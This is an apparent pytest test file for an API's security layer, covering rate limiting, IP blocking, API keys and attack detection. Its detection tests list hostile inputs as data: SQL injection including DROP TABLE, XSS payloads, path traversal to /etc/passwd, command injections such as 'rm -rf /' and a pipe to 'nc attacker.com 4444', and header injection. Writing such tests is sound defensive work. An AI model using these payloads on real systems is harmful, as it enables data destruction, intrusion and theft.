"""
Test cases for API Rate Limiting & Security - TDD Implementation.
These tests cover rate limiting, API security, CORS, security headers,
IP blocking, request throttling, and advanced security measures.
"""

import time
from datetime import datetime, timedelta, timezone
from unittest.mock import Mock, patch

import pytest
from app.middleware.rate_limiter import RateLimitMiddleware
from app.middleware.security import SecurityMiddleware
from app.models import UserRole
from app.services.rate_limiter import RateLimiterService
from app.services.security import SecurityService
from app.utils.ip_filter import IPFilterService


class TestRateLimitingSystem:
    """Test cases for API rate limiting functionality."""

    def test_rate_limiter_service_initialization(self):
        """Test RateLimiterService initialization."""
        service = RateLimiterService()

        assert service.default_requests_per_minute == 60
        assert service.default_burst_limit == 100
        assert hasattr(service, "rate_limits")
        assert hasattr(service, "user_requests")

    def test_rate_limit_configuration(self):
        """Test rate limit configuration for different endpoints."""
        service = RateLimiterService()

        # Configure rate limits
        service.configure_endpoint_limit(
            "/api/auth/login", requests_per_minute=5, burst_limit=10
        )
        service.configure_endpoint_limit(
            "/api/products", requests_per_minute=100, burst_limit=200
        )

        assert service.rate_limits["/api/auth/login"]["requests_per_minute"] == 5
        assert service.rate_limits["/api/products"]["burst_limit"] == 200

    @pytest.mark.asyncio
    async def test_rate_limit_enforcement(self):
        """Test rate limit enforcement logic."""
        service = RateLimiterService()
        service.configure_endpoint_limit(
            "/api/test", requests_per_minute=2, burst_limit=3
        )

        client_id = "test_client_123"
        endpoint = "/api/test"

        # First few requests should succeed
        for i in range(3):
            allowed = await service.check_rate_limit(client_id, endpoint)
            assert allowed is True

        # Next request should be rate limited
        allowed = await service.check_rate_limit(client_id, endpoint)
        assert allowed is False

    @pytest.mark.asyncio
    async def test_rate_limit_reset_after_window(self):
        """Test rate limit reset after time window."""
        service = RateLimiterService()
        service.configure_endpoint_limit(
            "/api/test", requests_per_minute=2, burst_limit=2
        )

        client_id = "test_client_456"
        endpoint = "/api/test"

        # Exhaust rate limit
        await service.check_rate_limit(client_id, endpoint)
        await service.check_rate_limit(client_id, endpoint)

        # Should be rate limited
        allowed = await service.check_rate_limit(client_id, endpoint)
        assert allowed is False

        # Simulate time passage
        with patch("time.time", return_value=time.time() + 61):
            allowed = await service.check_rate_limit(client_id, endpoint)
            assert allowed is True

    def test_different_rate_limits_per_user_role(self):
        """Test different rate limits based on user roles."""
        service = RateLimiterService()

        # Configure role-based limits
        service.configure_role_based_limits(
            {
                UserRole.ADMIN: {"requests_per_minute": 1000, "burst_limit": 2000},
                UserRole.VIEWER: {"requests_per_minute": 60, "burst_limit": 100},
            }
        )

        limits = service.get_user_rate_limits(UserRole.ADMIN)
        assert limits["requests_per_minute"] == 1000

        limits = service.get_user_rate_limits(UserRole.VIEWER)
        assert limits["requests_per_minute"] == 60

    @pytest.mark.asyncio
    async def test_rate_limit_by_ip_address(self):
        """Test rate limiting by IP address."""
        service = RateLimiterService()

        ip_address = "192.168.1.100"
        endpoint = "/api/public"

        # Configure IP-based rate limiting
        service.configure_ip_rate_limit(requests_per_minute=5, burst_limit=10)

        # Test IP rate limiting - should allow 5 requests, then block
        for i in range(6):  # Try 6 requests
            allowed = await service.check_ip_rate_limit(ip_address, endpoint)
            if i < 5:  # First 5 should succeed
                assert allowed is True
            else:  # 6th should fail
                assert allowed is False

    @pytest.mark.asyncio
    async def test_global_rate_limiting(self):
        """Test global rate limiting across all endpoints."""
        service = RateLimiterService()

        # Configure global limits
        service.configure_global_rate_limit(requests_per_second=10, max_concurrent=50)

        # Test global rate limit
        client_id = "global_test_client"

        # Should allow requests up to limit
        for i in range(10):
            allowed = await service.check_global_rate_limit(client_id)
            assert allowed is True

        # Should rate limit after threshold
        allowed = await service.check_global_rate_limit(client_id)
        assert allowed is False

    def test_rate_limit_headers(self):
        """Test rate limit headers in responses."""
        service = RateLimiterService()

        client_id = "header_test_client"
        endpoint = "/api/test"

        headers = service.get_rate_limit_headers(client_id, endpoint)

        assert "X-RateLimit-Limit" in headers
        assert "X-RateLimit-Remaining" in headers
        assert "X-RateLimit-Reset" in headers

    @pytest.mark.asyncio
    async def test_rate_limit_middleware_integration(self, client):
        """Test rate limit middleware integration."""
        # This would test the actual middleware with HTTP requests
        # For now, test the middleware logic
        from unittest.mock import Mock

        mock_app = Mock()
        middleware = RateLimitMiddleware(mock_app)

        assert middleware.rate_limiter is not None
        assert hasattr(middleware, "get_client_identifier")
        assert hasattr(middleware, "apply_rate_limit")


class TestSecurityMiddleware:
    """Test cases for security middleware and headers."""

    def test_security_middleware_initialization(self):
        """Test SecurityMiddleware initialization."""
        from unittest.mock import Mock

        mock_app = Mock()
        middleware = SecurityMiddleware(mock_app)

        assert middleware.enable_cors is True
        assert middleware.enable_security_headers is True
        assert hasattr(middleware, "allowed_origins")

    def test_cors_configuration(self):
        """Test CORS configuration and headers."""
        middleware = SecurityMiddleware(Mock())

        # Configure CORS
        middleware.configure_cors(
            allowed_origins=["https://frontend.example.com"],
            allowed_methods=["GET", "POST"],
            allowed_headers=["Authorization", "Content-Type"],
        )

        assert "https://frontend.example.com" in middleware.allowed_origins
        assert "GET" in middleware.allowed_methods

    def test_security_headers_configuration(self):
        """Test security headers configuration."""
        middleware = SecurityMiddleware(Mock())

        headers = middleware.get_security_headers()

        # Check for important security headers
        assert "X-Content-Type-Options" in headers
        assert "X-Frame-Options" in headers
        assert "X-XSS-Protection" in headers
        assert "Strict-Transport-Security" in headers
        assert "Content-Security-Policy" in headers

    def test_content_security_policy(self):
        """Test Content Security Policy configuration."""
        middleware = SecurityMiddleware(Mock())

        csp = middleware.get_content_security_policy()

        assert "default-src 'self'" in csp
        assert "script-src 'self'" in csp
        assert "style-src 'self'" in csp

    def test_request_sanitization(self):
        """Test request input sanitization."""
        service = SecurityService()

        # Test SQL injection prevention
        malicious_input = "'; DROP TABLE users; --"
        sanitized = service.sanitize_input(malicious_input)
        assert "DROP TABLE" not in sanitized

        # Test XSS prevention
        xss_input = "<script>alert('xss')</script>"
        sanitized = service.sanitize_input(xss_input)
        assert "<script>" not in sanitized

    def test_request_size_limits(self):
        """Test request size limitations."""
        middleware = SecurityMiddleware(Mock())

        # Configure size limits
        middleware.configure_size_limits(
            max_request_size=1024 * 1024,  # 1MB
            max_file_size=10 * 1024 * 1024,  # 10MB
        )

        assert middleware.max_request_size == 1024 * 1024
        assert middleware.max_file_size == 10 * 1024 * 1024

    def test_suspicious_request_detection(self):
        """Test detection of suspicious requests."""
        service = SecurityService()

        # Test various suspicious patterns
        suspicious_requests = [
            {"path": "/admin", "user_agent": "sqlmap"},
            {"path": "/api/users/../../../etc/passwd"},
            {
                "headers": {"X-Forwarded-For": "1.1.1.1, 2.2.2.2, 3.3.3.3"}
            },  # Too many proxies
        ]

        for request_data in suspicious_requests:
            is_suspicious = service.detect_suspicious_request(request_data)
            assert is_suspicious is True


class TestIPFiltering:
    """Test cases for IP filtering and blocking."""

    def test_ip_filter_service_initialization(self):
        """Test IPFilterService initialization."""
        service = IPFilterService()

        assert hasattr(service, "blocked_ips")
        assert hasattr(service, "allowed_ips")
        assert hasattr(service, "rate_limited_ips")

    def test_ip_blocking(self):
        """Test IP address blocking functionality."""
        service = IPFilterService()

        malicious_ip = "192.168.1.100"

        # Block IP
        service.block_ip(malicious_ip, reason="Suspicious activity")

        # Check if IP is blocked
        assert service.is_ip_blocked(malicious_ip) is True
        assert service.get_block_reason(malicious_ip) == "Suspicious activity"

    def test_ip_allowlist(self):
        """Test IP allowlist functionality."""
        service = IPFilterService()

        trusted_ip = "192.168.1.200"

        # Add to allowlist
        service.add_to_allowlist(trusted_ip, "Office IP")

        # Check allowlist
        assert service.is_ip_allowed(trusted_ip) is True
        assert trusted_ip in service.allowed_ips

    def test_geolocation_filtering(self):
        """Test geographic location-based filtering."""
        service = IPFilterService()

        # Configure country blocking
        service.configure_country_blocking(blocked_countries=["XX", "YY"])

        # Test IP from blocked country
        blocked_country_ip = "1.2.3.4"  # Simulate IP from blocked country
        with patch.object(service, "get_ip_country", return_value="XX"):
            assert service.is_ip_blocked_by_country(blocked_country_ip) is True

    def test_automatic_ip_blocking(self):
        """Test automatic IP blocking based on behavior."""
        service = IPFilterService()

        # Configure automatic blocking
        service.configure_auto_blocking(
            failed_attempts_threshold=5, time_window_minutes=10, block_duration_hours=1
        )

        suspicious_ip = "10.0.0.100"

        # Simulate failed attempts
        for i in range(6):  # Exceed threshold
            service.record_failed_attempt(suspicious_ip, "Invalid login")

        # IP should be automatically blocked
        assert service.is_ip_blocked(suspicious_ip) is True

    def test_ip_reputation_checking(self):
        """Test IP reputation checking against threat feeds."""
        service = IPFilterService()

        # Mock threat intelligence feed
        with patch.object(service, "check_threat_intelligence") as mock_check:
            mock_check.return_value = {
                "is_malicious": True,
                "categories": ["botnet", "spam"],
                "confidence": 0.95,
            }

            malicious_ip = "5.6.7.8"
            reputation = service.check_ip_reputation(malicious_ip)

            assert reputation["is_malicious"] is True
            assert "botnet" in reputation["categories"]

    def test_temporary_ip_blocking(self):
        """Test temporary IP blocking with expiration."""
        service = IPFilterService()

        temp_blocked_ip = "172.16.0.100"

        # Block temporarily
        block_until = datetime.now(timezone.utc) + timedelta(minutes=30)
        service.block_ip_temporarily(
            temp_blocked_ip, block_until, "Rate limit exceeded"
        )

        # Should be blocked now
        assert service.is_ip_blocked(temp_blocked_ip) is True

        # Simulate time passage
        with patch("app.utils.ip_filter.datetime") as mock_datetime:
            mock_datetime.now.return_value = block_until + timedelta(minutes=1)
            assert service.is_ip_blocked(temp_blocked_ip) is False


class TestAPIKeyAuthentication:
    """Test cases for API key-based authentication."""

    def test_api_key_generation(self):
        """Test API key generation."""
        service = SecurityService()

        api_key = service.generate_api_key()

        assert len(api_key) >= 32
        assert api_key.isalnum() or "_" in api_key or "-" in api_key

    def test_api_key_validation(self):
        """Test API key validation."""
        service = SecurityService()

        # Create API key
        api_key = service.generate_api_key()
        user_id = 123

        # Store API key
        service.store_api_key(api_key, user_id, permissions=["read", "write"])

        # Validate API key
        validation_result = service.validate_api_key(api_key)

        assert validation_result["valid"] is True
        assert validation_result["user_id"] == user_id
        assert "read" in validation_result["permissions"]

    def test_api_key_permissions(self):
        """Test API key permission system."""
        service = SecurityService()

        api_key = service.generate_api_key()
        user_id = 456

        # Store API key with limited permissions
        service.store_api_key(api_key, user_id, permissions=["read"])

        # Check permissions
        assert service.api_key_has_permission(api_key, "read") is True
        assert service.api_key_has_permission(api_key, "write") is False
        assert service.api_key_has_permission(api_key, "admin") is False

    def test_api_key_rate_limiting(self):
        """Test rate limiting for API keys."""
        service = SecurityService()
        rate_limiter = RateLimiterService()

        api_key = service.generate_api_key()
        user_id = 789

        # Configure API key rate limits
        service.store_api_key(
            api_key,
            user_id,
            permissions=["read"],
            rate_limit={"requests_per_hour": 100},
        )

        # Test rate limiting
        rate_limiter.configure_api_key_limits(api_key, requests_per_hour=100)

        # Should allow requests up to limit
        for i in range(100):
            allowed = rate_limiter.check_api_key_rate_limit(api_key)
            assert allowed is True

    def test_api_key_expiration(self):
        """Test API key expiration."""
        service = SecurityService()

        api_key = service.generate_api_key()
        user_id = 101
        expires_at = datetime.now(timezone.utc) + timedelta(days=30)

        # Store API key with expiration
        service.store_api_key(api_key, user_id, ["read"], expires_at=expires_at)

        # Should be valid now
        assert service.is_api_key_expired(api_key) is False

        # Simulate expiration
        with patch("app.services.security.datetime") as mock_datetime:
            mock_datetime.now.return_value = expires_at + timedelta(days=1)
            assert service.is_api_key_expired(api_key) is True


class TestRequestThrottling:
    """Test cases for advanced request throttling."""

    @pytest.mark.asyncio
    async def test_endpoint_specific_throttling(self):
        """Test throttling specific to different endpoints."""
        service = RateLimiterService()

        # Configure different limits for different endpoints
        service.configure_endpoint_limit("/api/auth/login", requests_per_minute=5)
        service.configure_endpoint_limit("/api/products", requests_per_minute=100)
        service.configure_endpoint_limit("/api/admin/*", requests_per_minute=20)

        client_id = "throttle_test_client"

        # Test login endpoint throttling
        for i in range(6):
            allowed = await service.check_rate_limit(client_id, "/api/auth/login")
            if i < 5:
                assert allowed is True
            else:
                assert allowed is False

    @pytest.mark.asyncio
    async def test_burst_limit_handling(self):
        """Test burst limit handling for sudden traffic spikes."""
        service = RateLimiterService()

        # Configure with burst allowance
        service.configure_endpoint_limit(
            "/api/search",
            requests_per_minute=60,
            burst_limit=120,
            burst_window_seconds=10,
        )

        client_id = "burst_test_client"
        endpoint = "/api/search"

        # Should allow burst requests
        for i in range(120):
            allowed = await service.check_rate_limit(client_id, endpoint)
            assert allowed is True

        # Should rate limit after burst
        allowed = await service.check_rate_limit(client_id, endpoint)
        assert allowed is False

    @pytest.mark.asyncio
    async def test_adaptive_rate_limiting(self):
        """Test adaptive rate limiting based on system load."""
        service = RateLimiterService()

        # Configure adaptive rate limiting
        service.enable_adaptive_limiting(
            base_requests_per_minute=100, load_threshold=0.8, reduction_factor=0.5
        )

        client_id = "adaptive_test_client"

        # Simulate high system load
        with patch.object(service, "get_system_load", return_value=0.9):
            # Rate limits should be reduced
            current_limit = service.get_current_rate_limit(client_id, "/api/test")
            assert current_limit < 100

    def test_rate_limit_exemptions(self):
        """Test rate limit exemptions for certain conditions."""
        service = RateLimiterService()

        # Configure exemptions
        service.configure_exemptions(
            exempt_ips=["192.168.1.0/24"],
            exempt_user_agents=["HealthCheck/1.0"],
            exempt_api_keys=["health_check_key"],
        )

        # Test IP exemption
        assert (
            service.is_exempt_from_rate_limiting(
                client_ip="192.168.1.100", user_agent="Normal Browser", api_key=None
            )
            is True
        )

        # Test user agent exemption
        assert (
            service.is_exempt_from_rate_limiting(
                client_ip="10.0.0.1", user_agent="HealthCheck/1.0", api_key=None
            )
            is True
        )


class TestSecurityScanning:
    """Test cases for security vulnerability scanning."""

    def test_sql_injection_detection(self):
        """Test SQL injection attack detection."""
        service = SecurityService()

        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM passwords",
            "'; EXEC xp_cmdshell('dir'); --",
        ]

        for malicious_input in malicious_inputs:
            is_malicious = service.detect_sql_injection(malicious_input)
            assert is_malicious is True

    def test_xss_attack_detection(self):
        """Test XSS attack detection."""
        service = SecurityService()

        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
        ]

        for payload in xss_payloads:
            is_xss = service.detect_xss_attempt(payload)
            assert is_xss is True

    def test_path_traversal_detection(self):
        """Test path traversal attack detection."""
        service = SecurityService()

        traversal_attempts = [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
        ]

        for attempt in traversal_attempts:
            is_traversal = service.detect_path_traversal(attempt)
            assert is_traversal is True

    def test_command_injection_detection(self):
        """Test command injection detection."""
        service = SecurityService()

        command_injections = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "test `whoami`",
        ]

        for injection in command_injections:
            is_injection = service.detect_command_injection(injection)
            assert is_injection is True

    def test_header_injection_detection(self):
        """Test HTTP header injection detection."""
        service = SecurityService()

        header_injections = [
            "test\r\nSet-Cookie: admin=true",
            "test\nLocation: http://attacker.com",
            "test\r\n\r\n<script>alert('xss')</script>",
        ]

        for injection in header_injections:
            is_injection = service.detect_header_injection(injection)
            assert is_injection is True


class TestAuthenticationSecurity:
    """Test cases for authentication security measures."""

    def test_password_breach_checking(self):
        """Test checking passwords against known breaches."""
        service = SecurityService()

        # Mock breach database
        with patch.object(service, "check_password_breach") as mock_check:
            mock_check.return_value = True

            breached_password = "password123"
            is_breached = service.is_password_breached(breached_password)

            assert is_breached is True

    def test_account_lockout_policy(self):
        """Test account lockout after failed attempts."""
        service = SecurityService()

        # Configure lockout policy
        service.configure_lockout_policy(
            max_failed_attempts=5, lockout_duration_minutes=30, progressive_delays=True
        )

        user_id = "test_user_lockout"

        # Simulate failed attempts
        for i in range(6):
            service.record_failed_login(user_id)

        # Account should be locked
        assert service.is_account_locked(user_id) is True

        # Check lockout duration
        lockout_info = service.get_lockout_info(user_id)
        assert lockout_info["locked"] is True
        assert lockout_info["unlock_at"] is not None

    def test_device_fingerprinting(self):
        """Test device fingerprinting for anomaly detection."""
        service = SecurityService()

        # Register device fingerprint
        user_id = "fingerprint_user"
        device_fingerprint = {
            "user_agent": "Mozilla/5.0...",
            "screen_resolution": "1920x1080",
            "timezone": "UTC-8",
            "language": "en-US",
        }

        service.register_device_fingerprint(user_id, device_fingerprint)

        # Test normal login from same device
        is_suspicious = service.check_device_anomaly(user_id, device_fingerprint)
        assert is_suspicious is False

        # Test login from different device
        different_device = {
            "user_agent": "Different Browser",
            "screen_resolution": "800x600",
            "timezone": "UTC+5",
            "language": "fr-FR",
        }

        is_suspicious = service.check_device_anomaly(user_id, different_device)
        assert is_suspicious is True

    def test_session_security(self):
        """Test session security measures."""
        service = SecurityService()

        session_id = "test_session_123"
        user_id = "session_user"

        # Create secure session
        session_data = service.create_secure_session(
            user_id, ip_address="192.168.1.100", user_agent="Test Browser"
        )

        assert "session_id" in session_data
        assert "expires_at" in session_data
        assert session_data["user_id"] == user_id

        # Validate session
        is_valid = service.validate_session(
            session_data["session_id"],
            ip_address="192.168.1.100",
            user_agent="Test Browser",
        )
        assert is_valid is True

        # Test session hijacking detection
        is_valid = service.validate_session(
            session_data["session_id"],
            ip_address="10.0.0.1",  # Different IP
            user_agent="Test Browser",
        )
        assert is_valid is False


class TestSecurityMonitoring:
    """Test cases for security monitoring and alerting."""

    def test_security_event_logging(self):
        """Test security event logging."""
        service = SecurityService()

        # Log security event
        service.log_security_event(
            event_type="failed_login",
            user_id="monitored_user",
            ip_address="192.168.1.100",
            details={
                "attempted_username": "admin",
                "failure_reason": "invalid_password",
            },
        )

        # Verify event was logged
        events = service.get_security_events(
            event_type="failed_login", time_range_hours=1
        )

        assert len(events) >= 1
        assert events[0]["user_id"] == "monitored_user"

    def test_anomaly_detection(self):
        """Test security anomaly detection."""
        service = SecurityService()

        # Configure anomaly detection
        service.configure_anomaly_detection(
            unusual_login_hours=True, unusual_locations=True, unusual_user_agents=True
        )

        user_id = "anomaly_user"

        # Establish baseline behavior
        for hour in range(9, 17):  # Normal business hours
            service.record_login_event(user_id, hour=hour, location="Office")

        # Test unusual login time
        anomaly = service.check_login_anomaly(user_id, hour=3, location="Office")
        assert anomaly["is_anomaly"] is True
        assert "unusual_time" in anomaly["reasons"]

    def test_threat_intelligence_integration(self):
        """Test threat intelligence feed integration."""
        service = SecurityService()

        # Mock threat intelligence API
        with patch.object(service, "query_threat_intelligence") as mock_query:
            mock_query.return_value = {
                "malicious": True,
                "categories": ["phishing", "malware"],
                "confidence": 0.9,
            }

            suspicious_ip = "1.2.3.4"
            threat_info = service.check_threat_intelligence(suspicious_ip)

            assert threat_info["malicious"] is True
            assert threat_info["confidence"] >= 0.8

    def test_security_alerts(self):
        """Test security alerting system."""
        service = SecurityService()

        # Configure alert thresholds
        service.configure_security_alerts(
            failed_login_threshold=10,
            suspicious_activity_threshold=5,
            alert_channels=["email", "slack"],
        )

        # Trigger security alert
        alert = service.trigger_security_alert(
            alert_type="multiple_failed_logins",
            severity="high",
            details={
                "user_id": "alert_user",
                "failed_attempts": 15,
                "time_window": "5 minutes",
            },
        )

        assert alert["triggered"] is True
        assert alert["severity"] == "high"


class TestComplianceAndAuditing:
    """Test cases for compliance and auditing features."""

    def test_audit_trail_logging(self):
        """Test comprehensive audit trail logging."""
        service = SecurityService()

        # Log various audit events
        events = [
            {
                "action": "user_login",
                "user_id": "audit_user",
                "timestamp": datetime.now(timezone.utc),
                "ip_address": "192.168.1.100",
            },
            {
                "action": "data_access",
                "user_id": "audit_user",
                "resource": "product_123",
                "timestamp": datetime.now(timezone.utc),
            },
            {
                "action": "permission_change",
                "admin_user_id": "admin_user",
                "target_user_id": "audit_user",
                "old_role": "viewer",
                "new_role": "admin",
                "timestamp": datetime.now(timezone.utc),
            },
        ]

        for event in events:
            service.log_audit_event(**event)

        # Retrieve audit trail
        audit_trail = service.get_audit_trail(user_id="audit_user", time_range_hours=24)

        assert len(audit_trail) >= 2
        assert any(event["action"] == "user_login" for event in audit_trail)

    def test_data_retention_policies(self):
        """Test data retention policy enforcement."""
        service = SecurityService()

        # Configure retention policies
        service.configure_retention_policies(
            {
                "audit_logs": {"retention_days": 365},
                "security_events": {"retention_days": 90},
                "rate_limit_data": {"retention_days": 30},
            }
        )

        # Test policy application
        policies = service.get_retention_policies()
        assert policies["audit_logs"]["retention_days"] == 365
        assert policies["security_events"]["retention_days"] == 90

    def test_gdpr_compliance_features(self):
        """Test GDPR compliance features."""
        service = SecurityService()

        user_id = "gdpr_user"

        # Test data export
        user_data = service.export_user_data(user_id)
        assert "personal_data" in user_data
        assert "audit_trail" in user_data
        assert "security_events" in user_data

        # Test data deletion
        deletion_result = service.delete_user_data(
            user_id, verification_token="valid_token"
        )
        assert deletion_result["deleted"] is True
        assert deletion_result["retained_data"] is not None  # Legal retention


# Fixtures for security testing
@pytest.fixture
def mock_request():
    """Mock HTTP request for testing."""

    class MockRequest:
        def __init__(self):
            self.client = Mock()
            self.client.host = "192.168.1.100"
            self.headers = {
                "user-agent": "Test Browser",
                "authorization": "Bearer test_token",
            }
            self.url = Mock()
            self.url.path = "/api/test"
            self.method = "GET"

    return MockRequest()


@pytest.fixture
def sample_security_events():
    """Sample security events for testing."""
    return [
        {
            "event_type": "failed_login",
            "timestamp": datetime.now(timezone.utc),
            "ip_address": "192.168.1.100",
            "user_id": "test_user",
        },
        {
            "event_type": "suspicious_activity",
            "timestamp": datetime.now(timezone.utc),
            "ip_address": "10.0.0.1",
            "details": {"reason": "unusual_location"},
        },
    ]


@pytest.fixture
def mock_threat_intelligence():
    """Mock threat intelligence data."""
    return {
        "1.2.3.4": {
            "malicious": True,
            "categories": ["botnet", "spam"],
            "confidence": 0.95,
        },
        "192.168.1.100": {"malicious": False, "categories": [], "confidence": 0.1},
    }
